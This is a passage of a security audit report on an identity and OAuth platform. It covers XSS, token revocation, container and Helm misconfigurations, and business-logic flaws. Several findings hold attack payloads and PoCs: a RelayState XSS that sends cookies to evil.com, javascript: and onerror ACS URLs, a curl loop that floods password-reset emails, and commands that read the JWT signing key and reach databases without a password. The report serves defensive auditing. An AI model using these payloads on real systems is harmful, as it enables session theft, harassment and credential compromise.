4. **PII masking** — `obfuscateEventPII` masks email, phone, IP in ActorName, ResourceName, and Metadata before DB persistence. `pii.Obfuscate` handles email, phone, IP, UUID, SSN, credit card. Both auth and OAuth services have `pii_logging.go` wrappers. Audit log exports have a `maskPII` flag (export_service.go:228-248).

5. **User export** — The JSON export (http.go:1437-1454) uses a safe field map (no password_hash, no phone, no last_login_ip). The CSV export (http.go:1423-1434) includes phone but only the requesting tenant's users.

6. **Tenant isolation** — `ListClients` passes `tc.TenantID` from context to `clientRepo.ListClients` for tenant-scoped queries. `ListUsers` uses `injectTenant(r)` and passes tenant context through to the service layer. The search/filter parameters in `listUsers` are tenant-scoped.

---

## Attack Surface #6: Injection & Input Validation

### P1-1: Reflected XSS via SAML RelayState and ACS URL in SSO Flow

**Severity:** P1 (High)
**CVSS:** 7.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Location:** `services/oauth/internal/server/server.go:1596`

**Root cause:**

The SAML IdP SSO endpoint (`/saml/idp/sso`) constructs an HTML auto-submit form to deliver the SAML response via HTTP-POST binding. Both the `action` attribute (from `spACSURL`) and the `RelayState` hidden input value are inserted into the HTML template via `fmt.Sprintf` without any HTML escaping:

```go
// line 1511: relayState comes directly from user form input
relayState := r.FormValue("RelayState")

// line 1542: spACSURL extracted from attacker-controlled SAML AuthnRequest XML
spEntityID, spACSURL, requestID := parseAuthnRequest(rawXML)

// line 1596: both inserted into HTML without escaping
html := fmt.Sprintf(`<!DOCTYPE html><html><body onload="document.forms[0].submit()">
<form method="POST" action="%s">
<input type="hidden" name="SAMLResponse" value="%s"/>
<input type="hidden" name="RelayState" value="%s"/>
</form></body></html>`, spACSURL, encoded, relayState)
```

**Attack vector 1 — RelayState XSS:**
An attacker crafts a SAML SSO initiation URL with a malicious `RelayState` parameter:
```
GET /saml/idp/sso?SAMLRequest={valid_base64_encoded_authnrequest}&RelayState="><script>document.location='https://evil.com/steal?c='+document.cookie</script>"
```
When the victim clicks this link (or is redirected to it), the server returns an HTML page where the `RelayState` value breaks out of the `value=""` attribute and injects arbitrary JavaScript. The `onload="document.forms[0].submit()"` auto-submits the form, but the injected script executes first.

**Attack vector 2 — ACS URL XSS:**
The `AssertionConsumerServiceURL` is extracted from the SAML AuthnRequest XML using string parsing (`parseAuthnRequest`, line 2967-2999) with no URL validation. An attacker crafts a SAML AuthnRequest with a malicious ACS URL:
```
AssertionConsumerServiceURL="javascript:alert(document.cookie)//"
```
or
```
AssertionConsumerServiceURL=""><img src=x onerror=alert(1)>//"
```
This is inserted into the `action="%s"` attribute, enabling script injection.

**Impact:**
- Cookie/token theft (access tokens are passed as query params in this flow)
- Session hijacking of the victim's authenticated session
- Credential phishing via redirect to attacker-controlled page
- The XSS executes in the context of the OAuth IdP origin, which may have access to sensitive tokens and session data

**Remediation:**
- Use `html.EscapeString()` for `spACSURL`, `relayState`, and `encoded` before inserting into HTML
- Validate `spACSURL` is an `https://` URL (or `http://` for localhost) before using it
- Consider using `html/template` package which auto-escapes by default

---

### P2-1: SOAR Engine notifySOC — Missing SSRF Protection (NEEDS-VERIFY)

**Severity:** P2 (Medium) — exploitable only if SOAR engine is wired to user-controllable playbooks
**Location:** `services/audit/internal/soar/engine.go:66, 288-294`

**Root cause:**

The SOAR engine's HTTP client is created without SSRF protection:
```go
// line 63-66
func NewEngine(pool *pgxpool.Pool) *Engine {
    return &Engine{
        client:  &http.Client{Timeout: 10 * time.Second},
        // No ssrfSafeDialContext transport, no CheckRedirect
    }
}
```

The `notifySOC` action sends HTTP POST to `action.Webhook` URL (line 288) without any URL validation:
```go
webhookURL := action.Webhook  // user-controlled via playbook config
req, err := http.NewRequestWithContext(ctx, http.MethodPost, webhookURL, bytes.NewReader(body))
resp, err := e.client.Do(req)  // no SSRF protection
```

**Note:** The SOAR engine does not appear to be instantiated in `services/audit/cmd/main.go` or wired to the HTTP server's route handlers (the SOAR routes use a separate in-memory playbook system). This may be dead code or planned for future integration. If the SOAR engine is activated and playbooks with `notify_soc` actions can be created via the API, this becomes a P1 SSRF vulnerability.

---

### Audit Summary — SQL Injection

**Finding:** No exploitable SQL injection found.

1. **fmt.Sprintf SQL patterns** — All `fmt.Sprintf` uses in SQL construction were reviewed:
   - `userColumns`, `clientColumns`, `mfaColumns` etc. are hardcoded column constant strings, not user input
   - Dynamic table names in `policy_map_repo.go`, `map_repo.go`, `cascade.go` use hardcoded table names passed as function parameters, not user input
   - `jit_migration.go:199` uses dynamic table/column names from config but validates with `^[a-zA-Z_][a-zA-Z0-9_]*$` regex (line 186-196)

2. **LIKE query wildcard escaping** — `escapeLikeWildcards()` is implemented and used in both `audit_repo.go:462-470` and `identity/pg_repo.go:910-914`. Properly escapes `%`, `_`, and `\` with `ESCAPE '\'` clause.

3. **ORDER BY dynamic fields** — `audit_repo.go:196-202` uses a switch/case whitelist for `OrderBy` values (`created_at`, `action`, `actor_name`), not direct user input interpolation. Direction is hardcoded `DESC`/`ASC` toggle.

4. **Integer interpolation in LIMIT/OFFSET** — `itdr_repo.go:169` and `threat_intel_repo.go:175` use `fmt.Sprintf` with `pageSize`/`offset` integers. These are clamped to int ranges before interpolation (e.g., `if pageSize < 1 || pageSize > 100 { pageSize = 20 }`). Not injectable via normal paths, but poor practice — should use parameterized queries.

### Audit Summary — Command Injection

**Finding:** No command injection found.

- `os/exec` is only used in `services/ggid-cli/internal/commands/browser.go:26` — opens a browser via `exec.Command(cmd, args...)` where `cmd` is determined by OS (not user input)
- `pkg/crypto/key_provider_pkcs11_test.go:62` — test-only, uses hardcoded `softhsm2-util` command
- No exec.Command usage in SCEP/MDM certificate operations

### Audit Summary — XSS (Stored)

**Finding:** No stored XSS found via API responses.

- API responses use `writeJSON` (JSON encoding), which is safe against HTML injection
- React frontend (`console/src/`) auto-escapes interpolated values by default
- Only `dangerouslySetInnerHTML` usage is a static dark-mode script (`layout.tsx:47`), not user input
- User fields (name, description, metadata) are returned in JSON API responses — no HTML rendering server-side
- The SAML SSO XSS (P1-1 above) is a reflected XSS, not stored

---

## Attack Surface #7: Session & Token Lifecycle

### P1-7A: Token Revocation Without Client Ownership — Any Valid Token Can Revoke Any Other Token

**Severity:** P1 (High)
**CVSS:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H)

**Affected endpoints:**
- `POST /oauth/revoke` (server.go:1069)
- `POST /api/v1/oauth/revoke` (server.go:1111)

**Description:**

The revocation endpoint implements a "public client fallback" that bypasses client authentication: if the caller provides any valid, active access token in the `token` form field, the request is treated as authenticated (server.go:1081-1094). This is intended to let SPA clients revoke their own tokens without a client_secret.

However, the ownership check that follows is effectively bypassed:

```go
// server.go:1098
authClientID := extractAuthClientID(r)
if authClientID != "" && token != "" {
    if !oauthSvc.ValidateTokenOwnership(token, authClientID) {
        w.WriteHeader(http.StatusOK) // silent per RFC
        return
    }
}
```

When the public client fallback is used (no Basic Auth, no `client_id` form field), `extractAuthClientID(r)` returns `""` (server.go:2584-2592). The entire ownership check block is skipped because `authClientID != ""` is false.

Additionally, `ValidateTokenOwnership` itself returns `true` when `clientID` is empty:

```go
// oauth_service.go:1784
if tokenStr == "" || clientID == "" {
    return true // can't verify, allow (auth gate still applies)
}
```

**Attack path:**
1. Attacker obtains or forges a valid access token (e.g., via password grant with stolen credentials, or via their own account)
2. Attacker calls `POST /oauth/revoke` with `token=<victim's_access_token>` and no client credentials
3. The public client fallback validates the attacker's own token in the `token` field — BUT WAIT: the `token` field IS the victim's token, so the attacker needs to provide the victim's token as `token`, and the fallback checks if THAT token is active
4. If the victim's token is active, revocation proceeds without ownership verification
5. **RevokeToken cascades** (oauth_service.go:1865-1881): revoking an access token also revokes ALL refresh tokens for that user via `UPDATE oidc_refresh_tokens SET revoked = true WHERE tenant_id = $1 AND user_id = $2`

**Impact:** An attacker who obtains any valid access token can revoke it AND cascade-revoke all refresh tokens for the token's user, causing a full denial-of-service logout for that user.

**NEEDS-VERIFY:** The public client fallback validates the token in the `token` field, which IS the token being revoked. This means the attacker must possess the victim's token to revoke it — making this primarily a self-revocation issue (an attacker can revoke a stolen token, which is expected behavior). However, the cascade revocation of ALL refresh tokens for the user is excessive: if an attacker steals a single access token, they can force-revoke all of the victim's refresh tokens, not just the one associated with the stolen token. The cascade should be scoped to the specific session/client, not the entire user.

---

### P2-7B: DPoP Binding Never Enforced at Resource Access — Bearer Token Theft Still Fully Exploitable

**Severity:** P2 (Medium)
**CVSS:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

**Description:**

DPoP (RFC 9449) is implemented for token issuance (server.go:942-977): when a client sends a `DPoP` header, the proof is validated and the access token is bound to the key thumbprint via `BindTokenToDPoP`. The binding is stored in `dpopCache` (sync.Map) and PG.

However, `CheckTokenDPoPBinding` (dpop_token_bind.go:27) is **never called outside of `handleDPoPTokenBind`** (dpop_token_bind.go:113). The gateway (services/gateway/) does not reference DPoP at all — there is no middleware that:
1. Checks if an incoming Bearer token has a DPoP binding
2. Requires a matching `DPoP` header for bound tokens
3. Rejects bound tokens presented without proof-of-possession

This means DPoP is **opt-in at issuance but never enforced at consumption**. A token bound to a DPoP key can still be used as a plain Bearer token by anyone who obtains it, completely defeating the purpose of proof-of-possession.

**Code evidence:**
- `grep -r "CheckTokenDPoPBinding" services/gateway/` → no results
- `grep -r "DPoP" services/gateway/` → only in openapi_spec.go (unrelated)
- The dedicated `DPoPVerifier` (dpop_verifier.go) is also never wired into the gateway

**Impact:** Stolen access tokens can be used directly as Bearer tokens regardless of DPoP binding, providing zero sender-constrained access protection.

---

### P2-7C: Revocation Ineffective Without Redis — CAE Blocklist Disabled in Dev/Single-Instance Mode

**Severity:** P2 (Medium — environment-dependent)

**Description:**

The gateway's Continuous Access Evaluation (CAE) check relies on a Redis ZSET (`ggid:revoked_jti`) to blocklist revoked JWT IDs. When `JTIBlocklist.rdb == nil` (no Redis configured), `IsRevoked()` returns `false` unconditionally:

```go
// jti_blocklist.go:59
if b.rdb == nil || jti == "" {
    return false // no Redis configured — rely on JWT expiry only
}
```

This means in single-instance deployments without Redis:
- `RevokeToken` only stores the revocation in `sync.Map` (revokedTokens) and PG
- The gateway has no access to these stores — it only checks Redis
- A revoked access token remains fully valid until its 15-minute `exp` claim passes

Additionally, the in-memory `sync.Map` (`revokedTokens`) is per-process and not shared across OAuth service instances. In multi-instance deployments without Redis, revocation on one instance does not propagate to others.

**Mitigation:** Production deployments are expected to use Redis. However, the fail-open behavior (returning `false` instead of failing closed) is a design choice that could be exploited if Redis is temporarily unavailable at startup and the JTI blocklist is nil.

---

### INFO-7D: Refresh Token Rotation is Atomic (ConsumeRefreshToken uses conditional UPDATE)

**Severity:** Informational (Positive finding)

**Description:**

The refresh token rotation uses a conditional UPDATE for atomic consumption:

```go
// pg_repo.go:468
func (r *pgIDTokenRepo) ConsumeRefreshToken(ctx context.Context, tenantID uuid.UUID, tokenHash string) (bool, error) {
    tag, err := r.pool.Exec(ctx, `UPDATE oidc_refresh_tokens SET revoked = true, used = true 
        WHERE tenant_id = $1 AND token_hash = $2 AND used = false AND revoked = false`, tenantID, tokenHash)
    return tag.RowsAffected() == 1, nil
}
```

This is race-safe: exactly one concurrent request wins. Losers get `consumed=false` and should be treated as token reuse (RFC 6749 §10.4). The auth-service path uses Redis `GetDel` for one-time use semantics (oauth_service.go:2193).

**Family ID:** The schema includes `family_id` column and `RevokeRefreshTokensByFamily` is implemented (pg_repo.go:445), but I could not verify if family revocation is actually triggered on token reuse. The refresh flow in `lookupAuthRefreshToken` (oauth_service.go:2190) does not check family_id or trigger family revocation — it only validates tenant and user. **NEEDS-VERIFY:** Is family-based revocation actually called when ConsumeRefreshToken returns false?

---

### INFO-7E: Session Management — No Session Fixation (New Session Created on Login)

**Severity:** Informational (Positive finding)

**Description:**

The auth service creates a new session with `crypto.GenerateRandomToken(32)` on each login (session_service.go:39). The session token is returned to the client; there is no session cookie reuse or session ID passed from the client. The `verifyCredentials` handler returns user_id and MFA status as JSON — the frontend receives a JWT, not a session cookie.

No session cookies are set in the auth HTTP handler (`grep` for `SetCookie|http.Cookie` returns no results). The system uses Bearer token authentication, not cookie-based sessions, which eliminates session fixation risk.

---

### INFO-7F: JWT Validation — exp/nbf/iat Validated by jwt/v5

**Severity:** Informational (Positive finding)

**Description:**

The gateway middleware uses `jwt.Parse` (middleware.go:717) with `jwt/v5`, which validates `exp`, `nbf`, and `iat` claims by default when present. The token is rejected if `exp` is expired or `nbf` is in the future. Issuer and audience are also validated via parser options.

However, `nbf` is never set in token issuance (`issueAccessTokenWithAMR`, oauth_service.go:1045-1106) — only `iat` and `exp` are set. This is acceptable but means `nbf` validation is effectively a no-op.

---

### INFO-7G: Token Not Passed via URL Query Parameter

**Severity:** Informational (Positive finding)

**Description:**

The system uses `Authorization: Bearer` header for token transport (gateway middleware.go:690-703). No evidence of tokens being accepted from URL query parameters (`?access_token=`) was found in the gateway or OAuth server.

---

### Summary for Attack Surface #7

| Finding | Severity | Status |
|---------|----------|--------|
| P1-7A: Revocation ownership bypass + excessive cascade | P1 | NEEDS-VERIFY (self-revocation vs DoS) |
| P2-7B: DPoP never enforced at resource access | P2 | Confirmed |
| P2-7C: Revocation ineffective without Redis | P2 | Confirmed (dev/single-instance) |
| INFO-7D: Refresh token rotation is atomic | Info | Positive |
| INFO-7E: No session fixation risk | Info | Positive |
| INFO-7F: JWT exp/nbf validated | Info | Positive |
| INFO-7G: No URL query param tokens | Info | Positive |

---

## Attack Surface #8: Infrastructure & Supply Chain Security

### P1-8A: All-in-One Container Runs as Root with PostgreSQL trust Auth

**Severity:** P1 (High)
**CVSS:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L)

**Location:** `deploy/all-in-one/Dockerfile`, `deploy/all-in-one/postgres-start.sh`, `deploy/all-in-one/supervisord.conf`

**Finding:**

The all-in-one Docker image has NO `USER` directive — the entire container runs as root. This includes:
- PostgreSQL (started via `su - postgres`)
- Redis (no auth, bound to 127.0.0.1)
- NATS (no auth)
- All 7 Go microservices
- Next.js console
- supervisord (explicitly `user=root`)

Additionally, `postgres-start.sh` configures PostgreSQL with `trust` authentication:
```sh
su - postgres -c "echo 'host all all 127.0.0.1/32 trust' >> $DATA_DIR/pg_hba.conf"
su - postgres -c "echo 'local all all trust' >> $DATA_DIR/pg_hba.conf"
```

And creates the database user as superuser:
```sh
su - postgres -c "psql -c \"CREATE USER ggid WITH PASSWORD 'ggid' superuser;\""
```

**Attack Path:**
1. Attacker gains RCE via any service vulnerability (e.g., SSRF, deserialization)
2. Since all services run as root in the same container, attacker has full container compromise
3. PostgreSQL `trust` auth means any local process can connect as `ggid` superuser without password
4. Attacker can read RSA private keys at `/app/configs/rsa_private.pem` — forge JWT tokens
5. Container escape risk is elevated since process runs as root

**PoC:** If an SSRF or path traversal vulnerability exists in any service, an attacker can:
```
# Connect to PostgreSQL without password (trust auth)
psql -h 127.0.0.1 -U ggid -d ggid

# Read JWT signing keys
cat /app/configs/rsa_private.pem

# Access Redis without auth
redis-cli -h 127.0.0.1
```

**Note:** The individual service Dockerfiles (`services/*/Dockerfile`) correctly use non-root users (`USER appuser` / `USER app`). The Helm chart deployments also set `securityContext` with `runAsNonRoot: true`, `runAsUser: 1001`, `allowPrivilegeEscalation: false`, and `capabilities.drop: [ALL]`. The all-in-one image is the primary exposure.

---

### P2-8B: Operator Dockerfile Runs as Root + curl|bash Supply Chain

**Severity:** P2 (Medium)
**Location:** `deploy/operator/Dockerfile`

**Finding:**

The K8s operator Dockerfile has no `USER` directive and runs as root. It also installs `kubectl` and `helm` via `curl | bash` without checksum verification:
```dockerfile
RUN curl -fsSL "https://dl.k8s.io/release/${KUBECTL_VERSION}/bin/linux/.../kubectl" \
    -o /usr/local/bin/kubectl && chmod +x /usr/local/bin/kubectl
RUN curl -fsSL "https://get.helm.sh/helm-${HELM_VERSION}-linux-...tar.gz" \
    | tar xz -C /tmp && mv /tmp/linux-*/helm /usr/local/bin/helm
```

**Risk:** Supply chain attack via compromised k8s.io or helm.sh CDN. No SHA256 checksum verification.

---

### P2-8C: Hardcoded Default Passwords in Helm values.yaml

**Severity:** P2 (Medium)
**Location:** `deploy/helm/ggid/values.yaml:25,43`

**Finding:**

The default Helm values contain hardcoded weak passwords:
```yaml
postgresql:
  auth:
    password: ggid        # line 25
redis:
  auth:
    password: ggid-redis  # line 43
```

While `values-prod.yaml` documents the need to override these, the default `values.yaml` will be used by operators who don't read the documentation. The Helm `secrets.yaml` template creates K8s Secrets from these values, meaning the passwords end up in the cluster as base64-encoded secrets.

**Attack Path:** Deploy with `helm install ggid ./deploy/helm/ggid` (no values override) -> PostgreSQL password is `ggid`, Redis password is `ggid-redis`. Anyone who can reach these services (pod-to-pod, port-forward, or if LoadBalancer is configured) can authenticate.

---

### P2-8D: Docker Compose Exposes Database Port to Host

**Severity:** P2 (Medium)
**Location:** `deploy/docker-compose.yaml:11`

**Finding:**

The development `docker-compose.yaml` exposes PostgreSQL on port 5432 to the host:
```yaml
ports:
  - "5432:5432"
```

With hardcoded credentials `POSTGRES_PASSWORD: ggid`. The `docker-compose.prod.yaml` correctly does NOT expose the port, but the dev compose file is commonly used and if run on a shared host, exposes the database.

Similarly, Redis is exposed without auth:
```yaml
redis:
  ports:
    - "6379:6379"
```

And LDAP with admin password `admin123`:
```yaml
ldap:
  ports:
    - "389:389"
    - "636:636"
  environment:
    LDAP_ADMIN_PASSWORD: "admin123"
```

---

### P2-8E: .dockerignore is Empty — Sensitive Files May Be Packaged

**Severity:** P2 (Medium)
**Location:** `.dockerignore`

**Finding:**

The `.dockerignore` file contains only a single newline character. This means `docker build` with context `.` will include ALL files in the build context, including:
- `.git/` directory (full git history, possibly containing past secrets)
- `.env` files if present
- `deploy/secrets/` directory
- Test files, documentation
- SDK example files

The all-in-one Dockerfile uses `COPY . .` in the builder stage, which copies everything. Any secret committed to the repo (even if later removed) would be in the `.git` directory and packaged into the image.

---

### P2-8F: InternalAuthPathOnly Bypasses Auth When Secret Empty

**Severity:** P2 (Medium)
**Location:** `pkg/middleware/internal_auth.go:184-187`

**Finding:**

```go
func InternalAuthPathOnly(cfg InternalAuthConfig) func(http.Handler) http.Handler {
    if len(cfg.Secret) == 0 {
        return func(next http.Handler) http.Handler { return next }
    }
```

When `INTERNAL_AUTH_SECRET` / `GGID_INTERNAL_SECRET` is not set AND `GGID_ENV` is `test` or `dev`, the secret defaults to `"dev-internal-secret"`. But in the all-in-one container, `GGID_ENV` is NOT set at all, so `LoadInternalSecret()` calls `log.Fatal` — which means the all-in-one container would crash on startup for services that call it (auth, policy, org, audit).

However, the gateway service does NOT call `LoadInternalSecrets()` — it only checks `GGID_ENV` for JWT issuer/audience warnings. The gateway has no internal auth middleware. This means internal `/internal/` endpoints on auth/policy/org/audit are either:
- Protected by `InternalAuthPathOnly` (if the service started with a secret)
- Completely unprotected passthrough (if secret is empty)

The `docker-compose.yml` provides a default `INTERNAL_AUTH_SECRET` value, but the all-in-one Dockerfile does NOT set it. This means in all-in-one mode, services that call `LoadInternalSecret()` will crash (fail-closed), which is safe but means the all-in-one image is broken unless `INTERNAL_AUTH_SECRET` is provided at runtime.

---

### P2-8G: No NetworkPolicy Default Deny for PostgreSQL/Redis

**Severity:** P2 (Medium)
**Location:** `deploy/helm/ggid/templates/networkpolicy.yaml`

**Finding:**

The NetworkPolicy template only creates policies for GGID services (gateway, identity, auth, etc.) but does NOT create NetworkPolicies for PostgreSQL, Redis, or NATS pods. While the gateway egress policy limits what the gateway can reach, there is no default-deny policy for the data tier:

1. No `default-deny-all` policy for the namespace
2. No ingress restriction on PostgreSQL pods — any pod in the namespace can reach PostgreSQL
3. No ingress restriction on Redis pods

The NetworkPolicy only applies `Ingress` policyTypes to backend services (allowing only from gateway pods), but does not restrict egress from backend services. A compromised backend pod can reach any endpoint in the cluster.

---

### P3-8H: CI/CD Pipeline Security Gaps

**Severity:** P3 (Low)
**Location:** `.github/workflows/ci.yml`, `.github/workflows/security.yml`

**Finding:**

1. **Security scans use `continue-on-error: true` or `|| true`**: Both `govulncheck` and `gosec` in the CI pipeline have `|| true` or `continue-on-error: true`, meaning vulnerabilities do not fail the build. The security workflow's gosec job explicitly uses `continue-on-error: true`.

2. **No SBOM generation**: No CycloneDX or SPDX SBOM is generated in the pipeline.

3. **No container image scanning**: No Trivy, Grype, or Snyk step to scan built Docker images for CVEs.

4. **Docker build disabled**: The `docker-build` job is set to `if: false` — images are never built in CI.

5. **No dependency pinning**: GitHub Actions use `@v4`, `@v5`, `@master` without SHA pinning, vulnerable to supply chain attacks.

6. **No secret scanning**: No TruffleHog, GitLeaks, or similar secret scanning step.

---

### P3-8I: TLS Configuration Adequate but CORS Potentially Permissive

**Severity:** P3 (Low) / INFO
**Location:** `deploy/nginx/nginx.conf`, `deploy/envoy/ggid-envoy.yaml`, `services/gateway/internal/middleware/per_tenant_cors.go`

**Finding:**

**TLS (Positive):** Nginx config correctly enforces TLS 1.2+1.3 with strong cipher suites. HSTS with preload is enabled. HTTP to HTTPS redirect is configured.

**CORS (NEEDS-VERIFY):** The per-tenant CORS middleware (`per_tenant_cors.go`) has a dev-mode fallback that allows localhost origins when no origins are explicitly configured. The `originAllowed()` function:
```go
if len(allowed) == 0 {
    if isLocalhostDevMode(origin) {
        return true
    }
    return false
}
```

The Envoy config has a CORS filter with no explicit allowed origins, which could allow any origin depending on Envoy's default behavior.

**Envoy JWKS (NEEDS-VERIFY):** The Envoy config fetches JWKS from `http://ggid-gateway:8080/.well-known/jwks.json` — this is HTTP not HTTPS, which is acceptable for internal cluster traffic but could be intercepted if the network is compromised.

---

### Summary for Attack Surface #8

| Finding | Severity | Status |
|---------|----------|--------|
| P1-8A: All-in-one runs as root + PG trust auth | P1 | Confirmed |
| P2-8B: Operator Dockerfile runs as root + curl bash | P2 | Confirmed |
| P2-8C: Hardcoded default passwords in Helm values | P2 | Confirmed |
| P2-8D: Dev docker-compose exposes DB/Redis/LDAP ports | P2 | Confirmed |
| P2-8E: Empty .dockerignore — sensitive files in image | P2 | Confirmed |
| P2-8F: InternalAuthPathOnly bypass when secret empty | P2 | Confirmed (fail-closed in non-dev) |
| P2-8G: No NetworkPolicy for PostgreSQL/Redis/NATS | P2 | Confirmed |
| P3-8H: CI/CD security scans non-blocking, no SBOM/scanning | P3 | Confirmed |
| P3-8I: TLS adequate, CORS dev-mode fallback | P3 | NEEDS-VERIFY |

---

## Attack Surface #9: Business Logic & Functional Abuse

### P1-9A: Password Reset Email Bombing — No Rate Limit on ForgotPassword

**Severity:** P1 (High)
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L)

**Location:**
- `services/auth/internal/server/http.go:962-998` — `forgotPassword` handler
- `services/auth/internal/service/auth_service.go:306-361` — `ForgotPassword` method

**Root cause:**

The `forgotPassword` endpoint has **no rate limiting** at any layer:

1. **Gateway rate limiter** (`services/gateway/internal/middleware/ratelimit.go:108-121`): The `getLimit()` function only applies limits to `/api/v1/auth/verify`, `/api/v1/auth/register`, and `/oauth/token`. The paths `/api/v1/auth/forgot-password`, `/api/v1/auth/password/forgot`, and `/api/v1/auth/reset-password` all fall through to the `default` case which returns `0` (no limit).

2. **Auth service** (`auth_service.go:306-361`): The `ForgotPassword` method has no rate limit check. Compare with `IssueMagicLink` (line 711-717) which correctly implements a per-email rate limit using `SetNX` with 60s TTL. `ForgotPassword` has no such protection.

3. **Sliding window limiter** (`sliding_ratelimit.go:162`): Operates per-tenant, not per-email or per-IP. An attacker within a tenant's rate limit can still flood the endpoint.

**Attack path:**
```
POST /api/v1/auth/forgot-password
{"email": "victim@example.com", "tenant_id": "<any-tenant>"}
```
- No authentication required (public endpoint)
- No rate limit at gateway or service layer
- Each call generates a reset token and sends an email
- 10 concurrent requests → 10 reset emails sent to victim
- 1000 requests/minute → 1000 emails/minute (email bombing)

**PoC:**
```bash
for i in $(seq 1 100); do
  curl -s -X POST http://gateway/api/v1/auth/forgot-password \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@example.com","tenant_id":"<uuid>"}' &
done
wait
# victim receives 100 password reset emails
```

**Note:** The endpoint always returns `{"reset_initiated": true}` (200) regardless of whether the email exists (good anti-enumeration), but the email is actually sent for real accounts.

**Impact:** Email bombing harassment, resource exhaustion (SMTP, Redis tokens), potential DoS on mail infrastructure.

**Recommendation:** Add per-email rate limit in `ForgotPassword` using the same `SetNX` pattern as `IssueMagicLink` (60s cooldown per email). Also add per-IP rate limit in gateway `getLimit()` for forgot-password paths.

---

### P2-9B: Registration Creates User Without Email Verification Gate

**Severity:** P2 (Medium)
**CVSS:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L)

**Location:**
- `services/auth/internal/server/http.go:820-919` — `register` handler
- `services/auth/internal/service/auth_service.go:250-294` — `Register` method

**Root cause:**

The registration flow creates a user and credential **without requiring email verification**:

1. The `register` handler (line 896) calls `CreateUserFromSocial` to create the user record immediately.
2. It then calls `authSvc.Register()` (line 911) to set the password.
3. The response (line 919) returns `201 Created` with `user_id` — no verification step.
4. There is no call to `SendVerificationEmail` in the registration flow.
5. `RequireEmailVerification` (line 170) only blocks **login** if set, not registration.

**Missing controls:**
- No email verification token is issued during registration
- No "pending" state for unverified accounts — user is immediately active
- The `registerRequest` struct (line 813-818) correctly excludes role/scope fields (good — no mass assignment)
- Default role is hardcoded to `"user"` (good — no admin escalation)
- But: if `RequireEmailVerification` is `false` (default in many configs), an attacker can register with any email and immediately access the system

**Attack path:**
```
POST /api/v1/auth/register
{"username":"attacker", "email":"ceo@company.com", "password":"ValidPass1!", "tenant_id":"<uuid>"}
→ 201 Created, user_id returned
→ If RequireEmailVerification=false: attacker can immediately login
→ If RequireEmailVerification=true: attacker cannot login but user record exists (account squatting)
```

**Impact:** Account squatting (registering with someone else's email), potential phishing if the email looks legitimate, resource pollution.

---

### P2-9C: Gateway Rate Limiter Missing Coverage for Critical Auth Endpoints

**Severity:** P2 (Medium)
**CVSS:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L)

**Location:**
- `services/gateway/internal/middleware/ratelimit.go:108-121` — `getLimit()` function

**Root cause:**

The gateway rate limiter only applies limits to three specific paths:
```go
case path == "/api/v1/auth/verify":      → LoginLimit
case path == "/api/v1/auth/register":     → RegisterLimit
case path == "/oauth/token":             → TokenLimit
case len(path) > 8 && path[:8] == "/api/v1/": → APILimit (generic)
default: → 0 (no limit)
```

**Missing explicit limits for:**
- `/api/v1/auth/forgot-password` — falls to generic APILimit (per-IP, not per-email)
- `/api/v1/auth/reset-password` — falls to generic APILimit
- `/api/v1/auth/password/forgot` — alias, same issue
- `/api/v1/auth/password/reset` — alias, same issue
- `/api/v1/auth/email/verify` — no specific limit
- SCIM endpoints (`/api/v1/scim/*`) — no specific limit
- OAuth token revocation, introspection — no specific limit

The generic `APILimit` applies per-IP, but:
- An attacker behind multiple IPs (botnet, proxy rotation) can bypass this
- The auth-level rate limits (login brute force) are IP-based in `CheckBruteForce` but forgot-password has no brute-force protection

**Impact:** Password reset email bombing (P1-9A), SCIM endpoint abuse, OAuth endpoint abuse.

---

### P2-9D: Impersonation Token Has No Audit Log Storage

**Severity:** P2 (Medium)
**CVSS:** 6.0 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N)

**Location:**
- `services/auth/internal/service/impersonation.go:44-80` — `IssueImpersonationToken`
- `services/auth/internal/server/wiring_handlers.go:24-190` — `handleImpersonate`
- `services/auth/internal/server/batch3c_handlers.go:58-64` — `handleImpersonationLog`

**Root cause:**

1. **No audit event published:** The `handleImpersonate` handler (wiring_handlers.go:98-190) issues an impersonation token and signs a JWT, but **never calls `publishAuditEvent`**. Compare with `register` (line 917), `logout` (line 947), `resetPassword` (line 1024) which all publish audit events.

2. **Impersonation log endpoint returns hardcoded empty data:** `handleImpersonationLog` (batch3c_handlers.go:58-64) always returns:
```go
writeJSON(w, http.StatusOK, map[string]any{
    "logs":  []map[string]any{},
    "total": 0,
})
```
No database query, no Redis lookup — it's a stub that always reports zero impersonations.

3. **In-memory store loss:** `ListActiveImpersonations` (impersonation.go:144-154) only reads from the in-memory map, not Redis. If the process restarts, tokens in Redis are not loaded back into memory until individually fetched. The list endpoint will miss all restarted tokens.

4. **Tenant check bypass:** The `handleImpersonate` handler checks `X-Tenant-ID` header (line 69-96), but the `IssueImpersonationToken` function (impersonation.go:44) takes `tenantID` from the request body, not from the header. The handler does validate cross-tenant via `req.TenantID != headerTenantID`, but if `req.TenantID` is empty, the token is issued with `uuid.Nil` tenant — the handler doesn't enforce `req.TenantID == headerTenantID` when `req.TenantID` is empty (line 79: the condition only triggers when `req.TenantID != ""`).

**Attack path (tenant bypass):**
```bash
POST /api/v1/auth/impersonate
Headers: X-Tenant-ID: <tenant_A>, X-Scopes: tenant:admin
Body: {"impersonator_id":"<admin_in_A>", "target_user_id":"<user_in_B>", "reason":"test"}
# req.TenantID is empty → line 79 check skipped → token issued with uuid.Nil tenant
# The impersonation JWT has "tenant_id": "" (empty string)
```

Wait — the JWT claims use `req.TenantID` directly (line 157: `"tenant_id": req.TenantID`), which is empty string. This creates a JWT with no tenant binding. The gateway's tenant resolver may then fail or default to the first tenant.

**Impact:** Impersonation actions are unaudited (compliance violation). Cross-tenant impersonation may be possible if `req.TenantID` is omitted and the gateway doesn't enforce tenant binding on the resulting JWT.

---

### P3-9E: Lockout Counter Uses Username — Bypassable with Email Variant

**Severity:** P3 (Low)
**CVSS:** 4.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Location:**
